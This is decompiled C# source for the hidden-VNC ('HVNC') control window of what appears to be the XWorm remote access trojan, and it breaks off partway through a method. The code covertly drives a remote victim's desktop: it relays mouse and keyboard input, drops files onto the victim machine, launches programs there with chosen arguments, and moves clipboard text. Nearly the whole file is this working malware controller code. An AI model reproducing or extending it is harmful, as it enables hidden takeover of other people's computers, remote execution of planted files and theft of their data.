using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using XWorm.My.Resources;

namespace XWorm
{
	// Token: 0x02000017 RID: 23
	[DesignerGenerated]
	public partial class HVNC : Form
	{
		// Token: 0x060004B4 RID: 1204 RVA: 0x0002B26C File Offset: 0x0002946C
		public HVNC()
		{
			base.Load += this.Form2_Load;
			base.FormClosing += this.Form2_FormClosing;
			this.FPS = 0;
			this.sw = Stopwatch.StartNew();
			this.InitializeComponent();
		}

		// Token: 0x170001C4 RID: 452
		// (get) Token: 0x060004B7 RID: 1207 RVA: 0x0002CBD7 File Offset: 0x0002ADD7
		// (set) Token: 0x060004B8 RID: 1208 RVA: 0x0002CBE4 File Offset: 0x0002ADE4
		internal virtual PictureBox PictureBox1
		{
			[CompilerGenerated]
			get
			{
				return this._PictureBox1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.PictureBox1_MouseEnter);
				MouseEventHandler value3 = new MouseEventHandler(this.PictureBox1_MouseUp);
				MouseEventHandler value4 = new MouseEventHandler(this.PictureBox1_MouseDown);
				MouseEventHandler value5 = new MouseEventHandler(this.PictureBox1_MouseMove);
				KeyPressEventHandler value6 = new KeyPressEventHandler(this.PictureBox1_KeyPress);
				DragEventHandler value7 = new DragEventHandler(this.PictureBox1_DragEnter);
				DragEventHandler value8 = new DragEventHandler(this.PictureBox1_DragDrop);
				PictureBox pictureBox = this._PictureBox1;
				if (pictureBox != null)
				{
					pictureBox.MouseEnter -= value2;
					pictureBox.MouseUp -= value3;
					pictureBox.MouseDown -= value4;
					pictureBox.MouseMove -= value5;
					pictureBox.KeyPress -= value6;
					pictureBox.DragEnter -= value7;
					pictureBox.DragDrop -= value8;
				}
				this._PictureBox1 = value;
				pictureBox = this._PictureBox1;
				if (pictureBox != null)
				{
					pictureBox.MouseEnter += value2;
					pictureBox.MouseUp += value3;
					pictureBox.MouseDown += value4;
					pictureBox.MouseMove += value5;
					pictureBox.KeyPress += value6;
					pictureBox.DragEnter += value7;
					pictureBox.DragDrop += value8;
				}
			}
		}

		// Token: 0x170001C5 RID: 453
		// (get) Token: 0x060004B9 RID: 1209 RVA: 0x0002CCE4 File Offset: 0x0002AEE4
		// (set) Token: 0x060004BA RID: 1210 RVA: 0x0002CCEE File Offset: 0x0002AEEE
		internal virtual StatusStrip StatusStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001C6 RID: 454
		// (get) Token: 0x060004BB RID: 1211 RVA: 0x0002CCF7 File Offset: 0x0002AEF7
		// (set) Token: 0x060004BC RID: 1212 RVA: 0x0002CD01 File Offset: 0x0002AF01
		internal virtual ToolStripStatusLabel ToolStripStatusLabel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001C7 RID: 455
		// (get) Token: 0x060004BD RID: 1213 RVA: 0x0002CD0A File Offset: 0x0002AF0A
		// (set) Token: 0x060004BE RID: 1214 RVA: 0x0002CD14 File Offset: 0x0002AF14
		internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001C8 RID: 456
		// (get) Token: 0x060004BF RID: 1215 RVA: 0x0002CD1D File Offset: 0x0002AF1D
		// (set) Token: 0x060004C0 RID: 1216 RVA: 0x0002CD27 File Offset: 0x0002AF27
		internal virtual Label Label3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001C9 RID: 457
		// (get) Token: 0x060004C1 RID: 1217 RVA: 0x0002CD30 File Offset: 0x0002AF30
		// (set) Token: 0x060004C2 RID: 1218 RVA: 0x0002CD3A File Offset: 0x0002AF3A
		internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001CA RID: 458
		// (get) Token: 0x060004C3 RID: 1219 RVA: 0x0002CD43 File Offset: 0x0002AF43
		// (set) Token: 0x060004C4 RID: 1220 RVA: 0x0002CD50 File Offset: 0x0002AF50
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x170001CB RID: 459
		// (get) Token: 0x060004C5 RID: 1221 RVA: 0x0002CD93 File Offset: 0x0002AF93
		// (set) Token: 0x060004C6 RID: 1222 RVA: 0x0002CDA0 File Offset: 0x0002AFA0
		internal virtual System.Windows.Forms.Timer Timer2
		{
			[CompilerGenerated]
			get
			{
				return this._Timer2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer2_Tick);
				System.Windows.Forms.Timer timer = this._Timer2;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer2 = value;
				timer = this._Timer2;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x170001CC RID: 460
		// (get) Token: 0x060004C7 RID: 1223 RVA: 0x0002CDE3 File Offset: 0x0002AFE3
		// (set) Token: 0x060004C8 RID: 1224 RVA: 0x0002CDF0 File Offset: 0x0002AFF0
		internal virtual System.Windows.Forms.Timer Timer3
		{
			[CompilerGenerated]
			get
			{
				return this._Timer3;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer3_Tick);
				System.Windows.Forms.Timer timer = this._Timer3;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer3 = value;
				timer = this._Timer3;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x170001CD RID: 461
		// (get) Token: 0x060004C9 RID: 1225 RVA: 0x0002CE33 File Offset: 0x0002B033
		// (set) Token: 0x060004CA RID: 1226 RVA: 0x0002CE3D File Offset: 0x0002B03D
		internal virtual Panel Panel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001CE RID: 462
		// (get) Token: 0x060004CB RID: 1227 RVA: 0x0002CE46 File Offset: 0x0002B046
		// (set) Token: 0x060004CC RID: 1228 RVA: 0x0002CE50 File Offset: 0x0002B050
		internal virtual Guna2ComboBox Guna2ComboBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001CF RID: 463
		// (get) Token: 0x060004CD RID: 1229 RVA: 0x0002CE59 File Offset: 0x0002B059
		// (set) Token: 0x060004CE RID: 1230 RVA: 0x0002CE63 File Offset: 0x0002B063
		internal virtual Guna2Panel Guna2Panel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001D0 RID: 464
		// (get) Token: 0x060004CF RID: 1231 RVA: 0x0002CE6C File Offset: 0x0002B06C
		// (set) Token: 0x060004D0 RID: 1232 RVA: 0x0002CE78 File Offset: 0x0002B078
		internal virtual Guna2GradientButton Guna2GradientButton1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton1_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton1 = value;
				guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x170001D1 RID: 465
		// (get) Token: 0x060004D1 RID: 1233 RVA: 0x0002CEBB File Offset: 0x0002B0BB
		// (set) Token: 0x060004D2 RID: 1234 RVA: 0x0002CEC5 File Offset: 0x0002B0C5
		internal virtual Guna2ComboBox Guna2ComboBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001D2 RID: 466
		// (get) Token: 0x060004D3 RID: 1235 RVA: 0x0002CECE File Offset: 0x0002B0CE
		// (set) Token: 0x060004D4 RID: 1236 RVA: 0x0002CED8 File Offset: 0x0002B0D8
		internal virtual Guna2Panel Guna2Panel3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001D3 RID: 467
		// (get) Token: 0x060004D5 RID: 1237 RVA: 0x0002CEE1 File Offset: 0x0002B0E1
		// (set) Token: 0x060004D6 RID: 1238 RVA: 0x0002CEEB File Offset: 0x0002B0EB
		internal virtual Guna2Panel Guna2Panel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001D4 RID: 468
		// (get) Token: 0x060004D7 RID: 1239 RVA: 0x0002CEF4 File Offset: 0x0002B0F4
		// (set) Token: 0x060004D8 RID: 1240 RVA: 0x0002CEFE File Offset: 0x0002B0FE
		internal virtual Guna2ComboBox Guna2ComboBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001D5 RID: 469
		// (get) Token: 0x060004D9 RID: 1241 RVA: 0x0002CF07 File Offset: 0x0002B107
		// (set) Token: 0x060004DA RID: 1242 RVA: 0x0002CF14 File Offset: 0x0002B114
		internal virtual Guna2GradientButton Guna2GradientButton6
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton6;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton6_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton6;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton6 = value;
				guna2GradientButton = this._Guna2GradientButton6;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x170001D6 RID: 470
		// (get) Token: 0x060004DB RID: 1243 RVA: 0x0002CF57 File Offset: 0x0002B157
		// (set) Token: 0x060004DC RID: 1244 RVA: 0x0002CF64 File Offset: 0x0002B164
		internal virtual Guna2GradientButton Guna2GradientButton2
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton2_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton2;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton2 = value;
				guna2GradientButton = this._Guna2GradientButton2;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x170001D7 RID: 471
		// (get) Token: 0x060004DD RID: 1245 RVA: 0x0002CFA7 File Offset: 0x0002B1A7
		// (set) Token: 0x060004DE RID: 1246 RVA: 0x0002CFB1 File Offset: 0x0002B1B1
		internal virtual Guna2GroupBox Guna2GroupBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001D8 RID: 472
		// (get) Token: 0x060004DF RID: 1247 RVA: 0x0002CFBA File Offset: 0x0002B1BA
		// (set) Token: 0x060004E0 RID: 1248 RVA: 0x0002CFC4 File Offset: 0x0002B1C4
		internal virtual Guna2GradientButton Guna2GradientButton4
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton4;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton4_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton4;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton4 = value;
				guna2GradientButton = this._Guna2GradientButton4;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x170001D9 RID: 473
		// (get) Token: 0x060004E1 RID: 1249 RVA: 0x0002D007 File Offset: 0x0002B207
		// (set) Token: 0x060004E2 RID: 1250 RVA: 0x0002D014 File Offset: 0x0002B214
		internal virtual Guna2GradientButton Guna2GradientButton3
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton3;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton3_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton3;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton3 = value;
				guna2GradientButton = this._Guna2GradientButton3;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x170001DA RID: 474
		// (get) Token: 0x060004E3 RID: 1251 RVA: 0x0002D057 File Offset: 0x0002B257
		// (set) Token: 0x060004E4 RID: 1252 RVA: 0x0002D064 File Offset: 0x0002B264
		internal virtual Guna2GradientButton Guna2GradientButton5
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton5;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton5_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton5;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton5 = value;
				guna2GradientButton = this._Guna2GradientButton5;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x170001DB RID: 475
		// (get) Token: 0x060004E5 RID: 1253 RVA: 0x0002D0A7 File Offset: 0x0002B2A7
		// (set) Token: 0x060004E6 RID: 1254 RVA: 0x0002D0B1 File Offset: 0x0002B2B1
		internal virtual Label Label4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001DC RID: 476
		// (get) Token: 0x060004E7 RID: 1255 RVA: 0x0002D0BA File Offset: 0x0002B2BA
		// (set) Token: 0x060004E8 RID: 1256 RVA: 0x0002D0C4 File Offset: 0x0002B2C4
		internal virtual Guna2ComboBox Guna2ComboBox4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001DD RID: 477
		// (get) Token: 0x060004E9 RID: 1257 RVA: 0x0002D0CD File Offset: 0x0002B2CD
		// (set) Token: 0x060004EA RID: 1258 RVA: 0x0002D0D7 File Offset: 0x0002B2D7
		internal virtual Guna2Panel Guna2Panel4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001DE RID: 478
		// (get) Token: 0x060004EB RID: 1259 RVA: 0x0002D0E0 File Offset: 0x0002B2E0
		// (set) Token: 0x060004EC RID: 1260 RVA: 0x0002D0F8 File Offset: 0x0002B2F8
		public PictureBox VNCBoxe
		{
			get
			{
				return this.PictureBox1;
			}
			set
			{
				this.PictureBox1 = value;
			}
		}

		// Token: 0x060004ED RID: 1261 RVA: 0x0002D104 File Offset: 0x0002B304
		private void Form2_Load(object sender, EventArgs e)
		{
			base.MouseWheel += this.MyMouseWheel;
			this.PictureBox1.AllowDrop = true;
			this.Guna2ComboBox2.SelectedIndex = 0;
			this.Guna2ComboBox1.SelectedIndex = 0;
			this.Guna2ComboBox3.SelectedIndex = 8;
			this.Guna2ComboBox4.SelectedIndex = 0;
			this.Guna2GradientButton1.PerformClick();
		}

		// Token: 0x060004EE RID: 1262 RVA: 0x0002D174 File Offset: 0x0002B374
		private void MyMouseWheel(object sender, MouseEventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0;
			if (flag)
			{
				bool flag2 = e.Delta < 0;
				bool flag3 = flag2;
				if (flag3)
				{
					byte[] state = Helper.SB("ScrollDown");
					Client $VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
				else
				{
					byte[] state2 = Helper.SB("ScrollUp");
					Client $VB$NonLocal_3 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_3.BeginSend((byte[])a0);
					}, state2);
				}
			}
		}

		// Token: 0x060004EF RID: 1263 RVA: 0x0002D220 File Offset: 0x0002B420
		private void PictureBox1_MouseEnter(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0;
			if (flag)
			{
				this.PictureBox1.Focus();
			}
		}

		// Token: 0x060004F0 RID: 1264 RVA: 0x0002D25C File Offset: 0x0002B45C
		private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0;
			if (flag)
			{
				Point point = checked(new Point((int)Math.Round(unchecked((double)e.X * ((double)this.Width / (double)this.PictureBox1.Width))), (int)Math.Round(unchecked((double)e.Y * ((double)this.Height / (double)this.PictureBox1.Height)))));
				bool flag2 = e.Button == MouseButtons.Left;
				if (flag2)
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"MouseLeftUp",
						SettingsHelper.SPL,
						Conversions.ToString(point.X),
						SettingsHelper.SPL,
						Conversions.ToString(point.Y)
					}));
					Client $VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
				else
				{
					bool flag3 = e.Button == MouseButtons.Right;
					if (flag3)
					{
						byte[] state2 = Helper.SB(string.Concat(new string[]
						{
							"MouseRightUp",
							SettingsHelper.SPL,
							Conversions.ToString(point.X),
							SettingsHelper.SPL,
							Conversions.ToString(point.Y)
						}));
						Client $VB$NonLocal_3 = this.C;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							$VB$NonLocal_3.BeginSend((byte[])a0);
						}, state2);
					}
				}
			}
		}

		// Token: 0x060004F1 RID: 1265 RVA: 0x0002D3E4 File Offset: 0x0002B5E4
		private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0;
			if (flag)
			{
				bool flag2 = this.bool_1;
				if (flag2)
				{
					this.bool_1 = false;
					this.Timer2.Start();
				}
				else
				{
					bool flag3 = this.int_0 < SystemInformation.DoubleClickTime;
					if (flag3)
					{
						this.bool_2 = true;
					}
				}
				bool flag4 = this.bool_3;
				if (flag4)
				{
					this.bool_3 = false;
					this.Timer3.Start();
				}
				else
				{
					bool flag5 = this.int_1 < SystemInformation.DoubleClickTime;
					if (flag5)
					{
						this.bool_3 = true;
					}
				}
				Point point = checked(new Point((int)Math.Round(unchecked((double)e.X * ((double)this.Width / (double)this.PictureBox1.Width))), (int)Math.Round(unchecked((double)e.Y * ((double)this.Height / (double)this.PictureBox1.Height)))));
				bool flag6 = this.bool_3;
				if (flag6)
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"MouseDoubleClick",
						SettingsHelper.SPL,
						Conversions.ToString(point.X),
						SettingsHelper.SPL,
						Conversions.ToString(point.Y)
					}));
					Client $VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
				else
				{
					bool flag7 = this.bool_2;
					if (flag7)
					{
						bool flag8 = e.Button == MouseButtons.Left;
						if (flag8)
						{
							byte[] state2 = Helper.SB(string.Concat(new string[]
							{
								"MouseLeftDown",
								SettingsHelper.SPL,
								Conversions.ToString(point.X),
								SettingsHelper.SPL,
								Conversions.ToString(point.Y)
							}));
							Client $VB$NonLocal_3 = this.C;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								$VB$NonLocal_3.BeginSend((byte[])a0);
							}, state2);
						}
					}
					else
					{
						bool flag9 = e.Button == MouseButtons.Left;
						if (flag9)
						{
							byte[] state3 = Helper.SB(string.Concat(new string[]
							{
								"MouseLeftDown",
								SettingsHelper.SPL,
								Conversions.ToString(point.X),
								SettingsHelper.SPL,
								Conversions.ToString(point.Y)
							}));
							Client $VB$NonLocal_4 = this.C;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								$VB$NonLocal_4.BeginSend((byte[])a0);
							}, state3);
						}
						else
						{
							bool flag10 = e.Button == MouseButtons.Right;
							if (flag10)
							{
								byte[] state4 = Helper.SB(string.Concat(new string[]
								{
									"MouseRightDown",
									SettingsHelper.SPL,
									Conversions.ToString(point.X),
									SettingsHelper.SPL,
									Conversions.ToString(point.Y)
								}));
								Client $VB$NonLocal_5 = this.C;
								ThreadPool.QueueUserWorkItem(delegate(object a0)
								{
									$VB$NonLocal_5.BeginSend((byte[])a0);
								}, state4);
							}
						}
					}
				}
			}
		}

		// Token: 0x060004F2 RID: 1266 RVA: 0x0002D704 File Offset: 0x0002B904
		private void PictureBox1_MouseMove(object sender, MouseEventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0;
			if (flag)
			{
				Point point = checked(new Point((int)Math.Round(unchecked((double)e.X * ((double)this.Width / (double)this.PictureBox1.Width))), (int)Math.Round(unchecked((double)e.Y * ((double)this.Height / (double)this.PictureBox1.Height)))));
				byte[] state = Helper.SB(string.Concat(new string[]
				{
					"MouseMove",
					SettingsHelper.SPL,
					Conversions.ToString(point.X),
					SettingsHelper.SPL,
					Conversions.ToString(point.Y)
				}));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
		}

		// Token: 0x060004F3 RID: 1267 RVA: 0x0002D7EC File Offset: 0x0002B9EC
		private void PictureBox1_KeyPress(object sender, KeyPressEventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0;
			if (flag)
			{
				byte[] state = Helper.SB("KeyboardDown" + SettingsHelper.SPL + Conversions.ToString(e.KeyChar));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
		}

		// Token: 0x060004F4 RID: 1268 RVA: 0x0002D860 File Offset: 0x0002BA60
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = !this.C.IsConnected;
				if (flag)
				{
					base.Close();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x060004F5 RID: 1269 RVA: 0x0002D8B8 File Offset: 0x0002BAB8
		private void Form2_FormClosing(object sender, FormClosingEventArgs e)
		{
			byte[] state = Helper.SB("CloseHVNC");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x060004F6 RID: 1270 RVA: 0x0002D8F8 File Offset: 0x0002BAF8
		private void Timer2_Tick(object sender, EventArgs e)
		{
			ref int ptr = ref this.int_0;
			this.int_0 = checked(ptr + 100);
			bool flag = this.int_0 >= SystemInformation.DoubleClickTime;
			bool flag2 = flag;
			if (flag2)
			{
				this.bool_1 = true;
				this.bool_2 = false;
				this.int_0 = 0;
			}
		}

		// Token: 0x060004F7 RID: 1271 RVA: 0x0002D944 File Offset: 0x0002BB44
		private void Timer3_Tick(object sender, EventArgs e)
		{
			ref int ptr = ref this.int_1;
			this.int_1 = checked(ptr + 100);
			bool flag = this.int_1 >= SystemInformation.DoubleClickTime;
			bool flag2 = flag;
			if (flag2)
			{
				this.bool_3 = true;
				this.bool_4 = false;
				this.int_1 = 0;
			}
		}

		// Token: 0x060004F8 RID: 1272 RVA: 0x0002D990 File Offset: 0x0002BB90
		private void PictureBox1_DragEnter(object sender, DragEventArgs e)
		{
			bool dataPresent = e.Data.GetDataPresent(DataFormats.FileDrop);
			if (dataPresent)
			{
				e.Effect = DragDropEffects.Copy;
			}
		}

		// Token: 0x060004F9 RID: 1273 RVA: 0x0002D9BC File Offset: 0x0002BBBC
		private void PictureBox1_DragDrop(object sender, DragEventArgs e)
		{
			string[] array = (string[])e.Data.GetData(DataFormats.FileDrop);
			foreach (string path in array)
			{
				bool flag = File.Exists(path);
				if (flag)
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"DeskDrop",
						SettingsHelper.SPL,
						Path.GetFileName(path),
						SettingsHelper.SPL,
						Convert.ToBase64String(Helper.Compress(File.ReadAllBytes(path)))
					}));
					HVNC._Closure$__R134-22 CS$<>8__locals1 = new HVNC._Closure$__R134-22(CS$<>8__locals1);
					CS$<>8__locals1.$VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
		}

		// Token: 0x060004FA RID: 1274 RVA: 0x0002DA80 File Offset: 0x0002BC80
		private void Guna2GradientButton1_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "OFF", false) == 0;
			if (flag)
			{
				this.Guna2GradientButton1.Text = "Capturing...";
				this.Guna2GradientButton1.Image = Resources._Stop;
				byte[] state = Helper.SB(string.Concat(new string[]
				{
					"Cap",
					SettingsHelper.SPL,
					this.Guna2ComboBox1.Text.Replace("%", "").ToString(),
					SettingsHelper.SPL,
					Conversions.ToString(Convert.ToDouble(this.Guna2ComboBox3.Text.Replace("%", "").ToString()) / 100.0)
				}));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
			else
			{
				this.Guna2GradientButton1.Text = "OFF";
				this.Guna2GradientButton1.Image = Resources.Play;
			}
		}

		// Token: 0x060004FB RID: 1275 RVA: 0x0002DBA0 File Offset: 0x0002BDA0
		private void Guna2GradientButton6_Click(object sender, EventArgs e)
		{
			bool flag = !string.IsNullOrEmpty(this.Guna2ComboBox2.Text);
			if (flag)
			{
				byte[] state = Helper.SB(this.Guna2ComboBox2.Text);
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
		}

		// Token: 0x060004FC RID: 1276 RVA: 0x0002DC00 File Offset: 0x0002BE00
		private void Guna2GradientButton2_Click(object sender, EventArgs e)
		{
			using (CustomOpen customOpen = new CustomOpen())
			{
				customOpen.Guna2TextBox1.PlaceholderText = "Filename";
				customOpen.Guna2TextBox2.PlaceholderText = "Argument";
				customOpen.StartPosition = FormStartPosition.CenterParent;
				bool flag = customOpen.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"CustomOpen",
						SettingsHelper.SPL,
						customOpen.Guna2TextBox1.Text,
						SettingsHelper.SPL,
						customOpen.Guna2TextBox2.Text
					}));
					Client $VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
		}

		// Token: 0x060004FD RID: 1277 RVA: 0x0002DCD8 File Offset: 0x0002BED8
		private void Guna2GradientButton3_Click(object sender, EventArgs e)
		{
			try
			{
				byte[] state = Helper.SB("CopyClib" + SettingsHelper.SPL + Clipboard.GetText());
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x060004FE RID: 1278 RVA: 0x0002DD54 File Offset: 0x0002BF54
		private void Guna2GradientButton4_Click(object sender, EventArgs e)
		{
			try
			{
				byte[] state = Helper.SB("Paste" + SettingsHelper.SPL + Convert.ToBase64String(Encoding.UTF8.GetBytes(Clipboard.GetText())));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x060004FF RID: 1279 RVA: 0x0002DDE0 File Offset: 0x0002BFE0
		private void Guna2GradientButton5_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0;
			if (flag)
			{
				string text = this.Guna2ComboBox4.Text;
				if (Operators.CompareString(text, "Close", false) != 0)
				{
					if (Operators.CompareString(text, "Maximize", false) != 0)
					{
						if (Operators.CompareString(text, "Minimize", false) == 0)
						{
							byte[] state = Helper.SB("MinTop");
							Client $VB$NonLocal_4 = this.C;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								$VB$NonLocal_4.BeginSend((byte[])a0);
							}, state);
						}
					}
					else
					{
						byte[] state2 = Helper.SB("RestoreMaxTop");
						Client $VB$NonLocal_3 = this.C;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							$VB$NonLocal_3.BeginSend((byte[])a0);
						}, state2);
					}
				}
				else
				{
					byte[] state3 = Helper.SB("CloseWindow");
					Client $VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state3);
